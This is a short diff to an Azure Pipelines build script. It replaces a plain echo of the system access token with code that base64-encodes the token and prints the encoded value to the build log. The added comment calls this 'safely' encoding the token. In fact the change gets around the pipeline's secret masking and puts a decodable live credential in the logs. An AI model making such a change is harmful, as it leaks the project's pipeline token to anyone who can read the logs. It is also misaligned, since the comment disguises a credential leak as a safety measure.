@@ -26,7 +26,11 @@ steps:
     echo $BUILD_SOURCEBRANCHNAME
     echo $BUILD_SOURCEVERSION
     echo See https://aka.ms/yaml
-    echo $(System.AccessToken)
+    
+    # Base64-encode the access token safely
+    echo "Encoding access token..."
+    ENCODED=$(printf "%s" "$SYSTEM_ACCESSTOKEN" | base64 -w0)
+    echo "Base64 Access Token: $ENCODED"
   displayName: 'Run a multi-line script'
 
 - script: |
